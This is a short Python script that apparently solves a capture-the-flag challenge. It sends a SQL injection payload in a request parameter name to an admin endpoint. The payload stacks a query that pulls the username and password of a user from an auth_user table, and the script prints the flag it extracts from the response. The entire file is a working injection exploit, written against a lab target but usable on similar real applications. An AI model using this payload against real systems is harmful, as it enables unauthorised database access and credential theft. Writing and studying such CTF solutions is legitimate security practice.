import requests
import sys
import re
proxies = {
    'http': '127.0.0.1:8080'
}

def solve_cve(addr):
    # We need session because of login
    sess = requests.session()
    sess.get(addr, params={'why': 'why You love AGH'})
    payload = "ingredients__a')='1'; SELECT 0,username,0,password FROM auth_user where id=3; -- "
    resp = sess.get(addr + '/admin/magic3/elixir', params={payload: '123'}, proxies=proxies)
    flag = re.search(r'bit{.*}', resp.text).group()
    print(flag)


if __name__ == '__main__':
    if len(sys.argv) < 1:
        print(f'{sys.argv[0]} [addr]')
        sys.exit(1)

    solve_cve(sys.argv[1])